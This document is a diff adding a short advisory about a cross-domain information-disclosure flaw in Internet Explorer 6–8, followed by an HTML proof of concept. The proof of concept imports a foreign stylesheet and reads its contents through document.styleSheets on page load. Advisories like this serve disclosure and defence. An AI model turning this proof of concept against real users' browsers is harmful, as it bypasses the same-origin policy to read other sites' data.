@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/42993/info
+
+Microsoft Internet Explorer is prone to a cross-domain information-disclosure vulnerability because the application fails to enforce the same-origin policy.
+
+An attacker can exploit this issue by enticing an unsuspecting user into viewing a page containing malicious content.
+
+Successful exploits will allow attackers to bypass the same-origin policy and obtain potentially sensitive information; other attacks are possible.
+
+This issue affects Internet Explorer 6, 7, and 8. 
+
+<html> <head> <style> @import url("http://www.example.com/hi_heige"); </style> <script> function loaded() { alert(document.styleSheets(0).imports(0).cssText); } </script> </head> <body onload="loaded()"> </body> </html> 
